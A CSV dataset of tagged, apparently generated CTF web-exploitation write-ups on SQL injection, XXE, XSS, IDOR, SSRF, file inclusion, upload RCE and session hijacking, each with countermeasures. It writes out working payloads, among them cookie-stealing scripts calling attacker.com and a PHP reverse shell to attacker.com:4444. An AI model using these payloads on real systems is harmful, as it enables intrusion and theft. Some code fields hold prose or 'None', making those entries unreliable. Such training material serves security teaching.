"filename","category","topic","text"
"writeup_0001_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that used a login form to authenticate users. After inspecting the login form's source code, I noticed that it was vulnerable to SQL injection, a common vulnerability that allows attackers to manipulate SQL queries and execute unauthorized actions on the database."
"writeup_0001_tagged.txt","web_exploitation","discovery","To test for a possible SQL injection vulnerability, I crafted an input containing malicious SQL code, such as ' or 1=1 --. If the application executed the SQL code and granted me access to the application, it would confirm the presence of a SQL injection vulnerability."
"writeup_0001_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted input to the login form, the web application indeed executed the SQL code and granted me access to the application, bypassing the authentication mechanism. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL injection vulnerability to extract data from the database."
"writeup_0001_tagged.txt","web_exploitation","code","`' or 1=1 --`"
"writeup_0001_tagged.txt","web_exploitation","exploitation","After crafting a suitable payload, I submitted it to the login form, which executed the SQL code and returned sensitive data, including the flag for the Web Exploitation challenge."
"writeup_0001_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of securing web applications against SQL injection vulnerabilities by validating and sanitizing user input, using prepared statements or parameterized queries, and restricting the privileges of database users. By exploiting the SQL injection vulnerability, I was able to bypass authentication, extract sensitive data, and obtain the flag needed to complete the challenge."
"writeup_0002_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that parsed XML input and displayed the results to the user. Given the nature of XML parsing and processing, I suspected that the application might be vulnerable to XML External Entity (XXE) injection, a type of vulnerability that allows attackers to read arbitrary files on the server or execute remote requests."
"writeup_0002_tagged.txt","web_exploitation","discovery","To test for XXE injection, I crafted an XML input containing a reference to an external entity, such as <!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> <root>&xxe;</root>. If the application parsed the input and displayed the contents of the passwd file, it would confirm the presence of an XXE injection vulnerability."
"writeup_0002_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted input to the application, it indeed displayed the contents of the passwd file, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XXE injection vulnerability to read a specific file on the server. After crafting a suitable payload and choosing the target file, I submitted the input to the application, which executed the XXE injection and displayed the contents of the file, including the flag for the Web Exploitation challenge."
"writeup_0002_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against XXE injection vulnerabilities by validating and sanitizing XML input, disabling external entity references, and restricting file system access. By exploiting the XXE injection vulnerability, I was able to read arbitrary files on the server, extract sensitive data, and obtain the flag needed to complete the challenge."
"writeup_0002_tagged.txt","web_exploitation","code","<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> <root>&xxe;</root>"
"writeup_0003_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to upload files, such as images or documents, to the server. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server."
"writeup_0003_tagged.txt","web_exploitation","discovery","To test for RCE, I crafted a malicious file containing executable code, such as a PHP web shell, and uploaded it to the server. If the application executed the code and granted me remote access to the server, it would confirm the presence of an RCE vulnerability."
"writeup_0003_tagged.txt","web_exploitation","exploitation","Upon submitting the malicious file to the application, it indeed executed the code and granted me remote access to the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute arbitrary commands on the server. After uploading a suitable payload, I executed the commands and obtained sensitive data, including the flag for the Web Exploitation challenge."
"writeup_0003_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of securing web applications against file upload vulnerabilities by validating and sanitizing file types and content, setting proper file permissions, and restricting file system access. By exploiting the RCE vulnerability, I was able to execute arbitrary commands on the server, access sensitive data, and obtain the flag needed to complete the challenge."
"writeup_0004_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that displayed user input without properly validating and sanitizing it, making it vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users."
"writeup_0004_tagged.txt","web_exploitation","discovery","To test for XSS, I crafted a benign script, such as <script>alert('XSS')</script>, and submitted it to the application. If the application displayed the script and executed it in the context of another user, it would confirm the presence of an XSS vulnerability."
"writeup_0004_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted input to the application, it indeed displayed the script and executed it in the context of another user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of another user. After crafting a suitable payload, I submitted it to the application, which executed the XSS attack and stole the session cookie of another user, allowing me to access their account and obtain the flag for the Web Exploitation challenge."
"writeup_0004_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, encoding output to prevent script injection, and using HTTP-only session cookies. By exploiting the XSS vulnerability, I was able to steal session cookies, access user accounts, and obtain the flag needed to complete the challenge."
"writeup_0005_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that used SQL queries to authenticate users and grant access to restricted content. Given the potential security risks associated with SQL queries, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to manipulate SQL queries to perform unauthorized actions on the database."
"writeup_0005_tagged.txt","web_exploitation","discovery","To test for SQL Injection, I crafted a malicious input containing SQL code, such as ' OR 1=1;--, and submitted it to the application's login form. If the application allowed me to bypass authentication and gain access to restricted content, it would confirm the presence of an SQL Injection vulnerability."
"writeup_0005_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted input to the application, it indeed bypassed authentication and granted me access to restricted content, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive data from the database."
"writeup_0005_tagged.txt","web_exploitation","code","' OR 1=1;--,"
"writeup_0005_tagged.txt","web_exploitation","exploitation","After crafting a suitable payload and choosing the target data, I submitted the input to the application, which executed the SQL Injection and displayed the sensitive data, including the flag for the Web Exploitation challenge."
"writeup_0005_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by using parameterized queries, validating and sanitizing user input, and restricting database access. By exploiting the SQL Injection vulnerability, I was able to manipulate SQL queries, bypass authentication, access sensitive data, and obtain the flag needed to complete the challenge."
"writeup_0006_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that displayed sensitive data without proper access control, making it vulnerable to Insecure Direct Object Reference (IDOR), a type of vulnerability that allows attackers to manipulate object references to access unauthorized data."
"writeup_0006_tagged.txt","web_exploitation","discovery","To test for IDOR, I browsed the application's pages and observed the data displayed for each user. Upon noticing a pattern in the data's structure and IDs, I crafted a URL containing the ID of another user, such as http://example.com/user?id=2, and submitted it to the application. If the application displayed the sensitive data of the target user, it would confirm the presence of an IDOR vulnerability."
"writeup_0006_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted URL to the application, it indeed displayed the sensitive data of the target user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the IDOR vulnerability to access the sensitive data of a privileged user. After browsing the application and identifying a privileged user, I crafted a suitable URL containing their ID and submitted it to the application, which displayed their sensitive data, including the flag for the Web Exploitation challenge."
"writeup_0006_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against IDOR vulnerabilities by enforcing proper access control, using randomized and unpredictable object references, and performing input validation and sanitization. By exploiting the IDOR vulnerability, I was able to manipulate object references, access unauthorized data, and obtain the flag needed to complete the challenge."
"writeup_0007_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to upload and manage files. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server."
"writeup_0007_tagged.txt","web_exploitation","discovery","To test for RCE, I crafted a malicious file containing PHP code, such as a web shell, and uploaded it to the application. If the application allowed me to execute the code and obtain remote access to the server, it would confirm the presence of an RCE vulnerability."
"writeup_0007_tagged.txt","web_exploitation","exploitation","Upon uploading the crafted file to the application, it indeed allowed me to execute the PHP code and obtain remote access to the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute a specific command on the server."
"writeup_0007_tagged.txt","web_exploitation","code","`After researching the server's configuration and available commands, I crafted a suitable payload containing the desired command and uploaded it to the application, which executed the command and displayed the flag for the Web Exploitation challenge.`"
"writeup_0007_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against RCE vulnerabilities by validating and sanitizing user input, using file type validation and content inspection, and restricting file permissions and execution. By exploiting the RCE vulnerability, I was able to execute arbitrary code, obtain remote access to the server, and obtain the flag needed to complete the challenge."
"writeup_0008_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to submit feedback through a form. Given the potential security risks associated with form input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject and execute malicious scripts in the user's browser."
"writeup_0008_tagged.txt","web_exploitation","discovery","To test for XSS, I crafted a malicious input containing a script, such as <script>alert('XSS');</script>, and submitted it to the application's form. If the application allowed the script to execute and display the alert message, it would confirm the presence of an XSS vulnerability."
"writeup_0008_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted input to the application, it indeed executed the script and displayed the alert message, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the user's session cookie and impersonate them. After crafting a suitable payload containing a script to steal the session cookie, I submitted it to the application's form. The script successfully executed and sent the user's session cookie to a remote server controlled by me, allowing me to impersonate the user and obtain the flag for the Web Exploitation challenge."
"writeup_0008_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, using content security policies, and implementing input/output encoding. By exploiting the XSS vulnerability, I was able to inject and execute malicious scripts, steal sensitive information, and obtain the flag needed to complete the challenge."
"writeup_0008_tagged.txt","web_exploitation","code","<script>alert('XSS');</script>"
"writeup_0009_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to fetch and display web pages by specifying a URL parameter. Given the potential security risks associated with URL parameters, I suspected that the application might be vulnerable to Server-Side Request Forgery (SSRF), a type of vulnerability that allows attackers to manipulate and send unauthorized requests from the server."
"writeup_0009_tagged.txt","web_exploitation","discovery","To test for SSRF, I crafted a malicious URL containing a request to a vulnerable server, such as http://vulnerable-server.com/admin, and submitted it to the application's URL parameter. If the application allowed the request to execute and display the vulnerable server's response, it would confirm the presence of an SSRF vulnerability."
"writeup_0009_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted URL to the application, it indeed sent the request to the vulnerable server and displayed its response, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SSRF vulnerability to access a restricted resource on the server."
"writeup_0009_tagged.txt","web_exploitation","code","None"
"writeup_0009_tagged.txt","web_exploitation","exploitation","After researching the server's configuration and available resources, I crafted a suitable URL containing the desired resource and submitted it to the application's URL parameter. The server successfully executed the request and displayed the flag for the Web Exploitation challenge."
"writeup_0009_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against SSRF vulnerabilities by validating and sanitizing user input, using input/output encoding, and implementing white-listing and blacklisting techniques. By exploiting the SSRF vulnerability, I was able to manipulate and send unauthorized requests from the server, access restricted resources, and obtain the flag needed to complete the challenge."
"writeup_0010_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to login to a protected area by submitting their credentials through a login form. Given the potential security risks associated with login functionality, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to inject and execute malicious SQL commands in the application's database."
"writeup_0010_tagged.txt","web_exploitation","discovery","To test for SQL Injection, I crafted a malicious input containing SQL commands, such as 1' or '1'='1, and submitted it to the application's login form. If the application allowed the input to execute and bypass the login authentication, it would confirm the presence of an SQL Injection vulnerability."
"writeup_0010_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted input to the application, it indeed executed the SQL command and bypassed the login authentication, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the application's database."
"writeup_0010_tagged.txt","web_exploitation","code","`1' or '1'='1`"
"writeup_0010_tagged.txt","web_exploitation","exploitation","After researching the database's structure and available data, I crafted a suitable payload containing SQL commands to extract the desired information and submitted it to the application's login form. The server successfully executed the commands and displayed the flag for the Web Exploitation challenge."
"writeup_0010_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by validating and sanitizing user input, using parameterized queries, and implementing input/output encoding. By exploiting the SQL Injection vulnerability, I was able to inject and execute malicious SQL commands, bypass authentication, extract sensitive information, and obtain the flag needed to complete the challenge."
"writeup_0011_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to display and download files by specifying a URL parameter. Given the potential security risks associated with URL parameters, I suspected that the application might be vulnerable to Remote File Inclusion (RFI), a type of vulnerability that allows attackers to include and execute external files on the server."
"writeup_0011_tagged.txt","web_exploitation","discovery","To test for RFI, I crafted a malicious URL containing a reference to an external file, such as http://malicious-server.com/malicious.php, and submitted it to the application's URL parameter. If the application allowed the file to be included and executed on the server, it would confirm the presence of an RFI vulnerability."
"writeup_0011_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted URL to the application, it indeed included and executed the malicious file on the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RFI vulnerability to access and execute a specific file on the server. After researching the server's configuration and available files, I crafted a suitable URL containing the desired file and submitted it to the application's URL parameter. The server successfully included and executed the file, displaying the flag for the Web Exploitation challenge."
"writeup_0011_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against RFI vulnerabilities by validating and sanitizing user input, using whitelisting and blacklisting techniques, and implementing input/output encoding. By exploiting the RFI vulnerability, I was able to include and execute external files on the server, access restricted files, and obtain the flag needed to complete the challenge."
"writeup_0012_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to submit information through a form input and display it on a public page. Given the potential security risks associated with form input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject and execute malicious scripts on the client-side."
"writeup_0012_tagged.txt","web_exploitation","discovery","To test for XSS, I crafted a malicious input containing a script tag, such as <script>alert('XSS')</script>, and submitted it to the application's form input. If the application allowed the script to be injected and executed on the client-side, it would confirm the presence of an XSS vulnerability."
"writeup_0012_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted input to the application, it indeed injected and executed the malicious script on the client-side, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to execute a specific script on the client-side. After researching the application's structure and available resources, I crafted a suitable payload containing a script to extract the desired information and submitted it to the application's form input. The client successfully executed the script and displayed the flag for the Web Exploitation challenge."
"writeup_0012_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, using input/output encoding, and implementing white-listing and blacklisting techniques. By exploiting the XSS vulnerability, I was able to inject and execute malicious scripts on the client-side, access sensitive information, and obtain the flag needed to complete the challenge."
"writeup_0012_tagged.txt","web_exploitation","code","<script>alert('XSS')</script>"
"writeup_0013_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to view and edit their profile information through a dedicated page. Given the potential security risks associated with user data, I suspected that the application might be vulnerable to Insecure Direct Object Reference (IDOR), a type of vulnerability that allows attackers to access and modify sensitive data by manipulating direct object references."
"writeup_0013_tagged.txt","web_exploitation","discovery","To test for IDOR, I crafted a malicious request containing a direct object reference to another user's profile, such as http://website.com/profile?id=2, and submitted it to the application's user profile page. If the application allowed the request to access and modify the other user's sensitive information, it would confirm the presence of an IDOR vulnerability."
"writeup_0013_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted request to the application, it indeed accessed and displayed the other user's sensitive information, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the IDOR vulnerability to access and display a specific user's private data. After researching the application's structure and available resources, I crafted a suitable request containing a direct object reference to the desired user's profile and submitted it to the application's user profile page. The server successfully responded with the desired user's sensitive information, displaying the flag for the Web Exploitation challenge."
"writeup_0013_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against IDOR vulnerabilities by implementing proper authorization and authentication controls, using indirect object references, and performing access controls on sensitive data. By exploiting the IDOR vulnerability, I was able to access and modify sensitive data, obtain confidential information, and complete the Web Exploitation challenge."
"writeup_0014_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that used cookies to manage user authentication and session management. Given the potential security risks associated with cookies, I suspected that the application might be vulnerable to Broken Authentication and Session Management, a type of vulnerability that allows attackers to bypass authentication and hijack user sessions by manipulating cookies."
"writeup_0014_tagged.txt","web_exploitation","discovery","To test for Broken Authentication and Session Management, I crafted a malicious request containing a manipulated cookie with an arbitrary user ID, such as Cookie: user_id=123, and submitted it to the application's login page. If the application allowed the request to bypass authentication and log in as the arbitrary user, it would confirm the presence of a Broken Authentication and Session Management vulnerability."
"writeup_0014_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted request to the application, it indeed bypassed authentication and logged in as the arbitrary user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the Broken Authentication and Session Management vulnerability to hijack the session of a specific user."
"writeup_0014_tagged.txt","web_exploitation","exploitation","After researching the application's structure and available resources, I crafted a suitable cookie with the session ID of the desired user and submitted it to the application. The server successfully recognized the hijacked session and responded with the flag for the Web Exploitation challenge."
"writeup_0014_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against Broken Authentication and Session Management vulnerabilities by implementing proper session management controls, using secure cookies, and validating user input. By exploiting the vulnerability, I was able to bypass authentication, hijack user sessions, and complete the Web Exploitation challenge."
"writeup_0015_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to contact the website administrators via a contact form. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious code into web pages viewed by other users."
"writeup_0015_tagged.txt","web_exploitation","discovery","To test for XSS, I crafted a malicious payload containing a script that would steal the victim's session cookie, such as <script>new Image().src=""http://attacker.com/cookie?=""+document.cookie;</script>, and submitted it to the application's contact form. If the application allowed the payload to execute and steal the victim's session cookie, it would confirm the presence of an XSS vulnerability."
"writeup_0015_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted payload to the application, it indeed executed and stole the victim's session cookie, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to execute a script that would display the flag."
"writeup_0015_tagged.txt","web_exploitation","code","`<script>new Image().src=""http://attacker.com/cookie?=""+document.cookie;</script>`"
"writeup_0015_tagged.txt","web_exploitation","exploitation","After researching the application's structure and available resources, I crafted a suitable payload containing a script that would display the flag and submitted it to the application's contact form. The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge."
"writeup_0015_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookies, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge."
"writeup_0016_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to upload files to the server. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Directory Traversal, a type of vulnerability that allows attackers to access files outside of the intended upload directory."
"writeup_0016_tagged.txt","web_exploitation","discovery","To test for Directory Traversal, I crafted a malicious payload containing a path traversal sequence, such as ../, and appended it to the filename of a file that I wanted to upload, such as ../../../etc/passwd."
"writeup_0016_tagged.txt","web_exploitation","exploitation","If the application allowed the payload to execute and upload the file to the server outside of the intended upload directory, it would confirm the presence of a Directory Traversal vulnerability. Upon submitting the crafted payload to the application, it indeed executed and uploaded the file to the server outside of the intended upload directory, confirming the vulnerability."
"writeup_0016_tagged.txt","web_exploitation","discovery","To obtain the flag for the Web Exploitation challenge, I needed to use the Directory Traversal vulnerability to access a specific file on the server. After researching the server's file structure, I crafted a suitable payload containing the path to the desired file, such as ../../../flag.txt, and submitted it to the application's file upload functionality."
"writeup_0016_tagged.txt","web_exploitation","exploitation","The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge."
"writeup_0016_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against Directory Traversal vulnerabilities by implementing proper file upload controls, using secure file paths, and validating user input. By exploiting the vulnerability, I was able to access sensitive files, execute malicious code, and complete the Web Exploitation challenge."
"writeup_0017_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to login to the system. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to manipulate SQL queries executed by the application."
"writeup_0017_tagged.txt","web_exploitation","discovery","To test for SQL Injection, I crafted a malicious payload containing a SQL Injection attack string, such as ' OR 1=1 --, and submitted it to the application's login form. If the application allowed the payload to execute and bypassed the authentication process, it would confirm the presence of a SQL Injection vulnerability."
"writeup_0017_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted payload to the application, it indeed executed and bypassed the authentication process, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the database."
"writeup_0017_tagged.txt","web_exploitation","code","' OR 1=1 --"
"writeup_0017_tagged.txt","web_exploitation","exploitation","After researching the application's database structure and available resources, I crafted a suitable payload containing a SQL Injection attack string that would extract the flag from the database, such as ' UNION SELECT flag FROM flags --. The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge."
"writeup_0017_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by implementing proper input validation and output encoding controls, using parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information, execute malicious code, and complete the Web Exploitation challenge."
"writeup_0018_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to send messages to the site administrator through a contact form. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious scripts into a web page viewed by other users."
"writeup_0018_tagged.txt","web_exploitation","discovery","To test for XSS, I crafted a malicious payload containing a JavaScript script, such as <script>alert(""XSS Attack!"")</script>, and submitted it to the application's contact form. If the application allowed the payload to execute and display the JavaScript script to other users, it would confirm the presence of an XSS vulnerability."
"writeup_0018_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted payload to the application, it indeed executed and displayed the JavaScript script to other users, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user."
"writeup_0018_tagged.txt","web_exploitation","code","<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>"
"writeup_0018_tagged.txt","web_exploitation","exploitation","After researching the application's session management and cookie handling, I crafted a suitable payload containing a JavaScript script that would extract the session cookie from a logged-in user, such as <script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>. The server successfully recognized the payload and responded with the session cookie for the logged-in user."
"writeup_0018_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookie handling, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge."
"writeup_0019_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that allowed users to login to the system and manage their profiles. Given the potential security risks associated with user authentication and session management, I suspected that the application might be vulnerable to Broken Authentication and Session Management, a type of vulnerability that allows attackers to bypass authentication and hijack user sessions."
"writeup_0019_tagged.txt","web_exploitation","discovery","To test for Broken Authentication and Session Management, I crafted a malicious payload containing a tampered session ID, such as 1234567890abcdef, and submitted it to the application's login form. If the application allowed the payload to execute and bypassed the authentication process, it would confirm the presence of a Broken Authentication and Session Management vulnerability."
"writeup_0019_tagged.txt","web_exploitation","exploitation","Upon submitting the crafted payload to the application, it indeed executed and bypassed the authentication process, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the Broken Authentication and Session Management vulnerability to hijack the session of a logged-in user. After researching the application's session management and cookie handling, I crafted a suitable payload containing a tampered session ID that would hijack the session of a logged-in user, such as Cookie: PHPSESSID=1234567890abcdef. The server successfully recognized the payload and responded with the session of the logged-in user."
"writeup_0019_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against Broken Authentication and Session Management vulnerabilities by using secure session management, implementing proper authentication controls, and validating user input. By exploiting the vulnerability, I was able to bypass authentication, hijack user sessions, and complete the Web Exploitation challenge."
"writeup_0020_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a vulnerable web application that allowed users to upload files to the server."
"writeup_0020_tagged.txt","web_exploitation","discovery","Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute code on a remote server."
"writeup_0020_tagged.txt","web_exploitation","exploitation","To test for RCE, I crafted a malicious payload containing a PHP script that would execute the Linux command ls -la and save the output to a file. I then uploaded the file to the application's server and waited for it to execute. Upon checking the application's upload directory, I found that the output.txt file had been created and contained the expected output of the ls -la command. This confirmed the presence of an RCE vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute a reverse shell on the remote server. After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell script that would allow me to connect to the server and gain remote access."
"writeup_0020_tagged.txt","web_exploitation","code","<?php echo shell_exec('ls -la > /var/www/html/uploads/output.txt'); ?> <?php system('bash -i >& /dev/tcp/attacker.com/4444 0>&1'); ?>"
"writeup_0020_tagged.txt","web_exploitation","discovery","After executing the payload, I successfully gained a remote shell on the server and was able to complete the Web Exploitation challenge."
"writeup_0020_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using secure file uploads, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the remote server, gain remote access, and complete the Web Exploitation challenge."
"writeup_0021_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a search feature allowing users to search for content on the website. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to inject SQL code into a query and manipulate the database."
"writeup_0021_tagged.txt","web_exploitation","discovery","To test for SQL Injection, I entered a malicious payload containing SQL code into the search box, such as ' or 1=1;--, which would cause the application to return all results, regardless of the input. Upon submitting the payload, the application returned all results, confirming the presence of an SQL Injection vulnerability."
"writeup_0021_tagged.txt","web_exploitation","exploitation","To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the database. After researching the application's database structure and table names, I crafted a suitable payload containing SQL code that would extract sensitive information from the database, such as UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users';. This payload allowed me to identify the names of columns in the 'users' table, such as 'username' and 'password', which contained the sensitive information. Using the obtained column names, I crafted a second payload containing SQL code that would extract the usernames and passwords of all users in the 'users' table, such as UNION SELECT username, password FROM users;. This payload allowed me to obtain the sensitive information required to complete the Web Exploitation challenge."
"writeup_0021_tagged.txt","web_exploitation","code","`' or 1=1;--`"
"writeup_0021_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by implementing proper input validation and output encoding controls, using prepared statements and parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information from the database, complete the Web Exploitation challenge, and demonstrate the potential risks associated with SQL Injection."
"writeup_0022_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a search feature allowing users to search for content on the website. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious code into a web page and manipulate user data."
"writeup_0022_tagged.txt","web_exploitation","discovery","To test for XSS, I entered a malicious payload containing JavaScript code into the search box, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript code and display an alert box containing the text 'XSS'. Upon submitting the payload, the application executed the JavaScript code, confirming the presence of an XSS vulnerability."
"writeup_0022_tagged.txt","web_exploitation","exploitation","To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user. After researching the application's system and network configuration, I crafted a suitable payload containing JavaScript code that would steal the session cookie of a logged-in user and send it to an attacker-controlled server, such as <script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>. This payload allowed me to obtain the session cookie of a logged-in user, which I could then use to impersonate the user and complete the Web Exploitation challenge."
"writeup_0022_tagged.txt","web_exploitation","code","<script>alert('XSS');</script> <script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>"
"writeup_0022_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against Cross-Site Scripting vulnerabilities by implementing proper input validation and output encoding controls, using Content Security Policy (CSP), and validating user input. By exploiting the vulnerability, I was able to steal the session cookie of a logged-in user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS."
"writeup_0023_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a file inclusion feature allowing users to include external files into the application. Given the potential security risks associated with including user-provided files, I suspected that the application might be vulnerable to File Inclusion vulnerability, a type of vulnerability that allows attackers to include malicious files and execute arbitrary code."
"writeup_0023_tagged.txt","web_exploitation","discovery","To test for File Inclusion, I entered a malicious payload containing a path traversal sequence into the file inclusion parameter, such as ../../../../etc/passwd, which would cause the application to include the '/etc/passwd' file on the server."
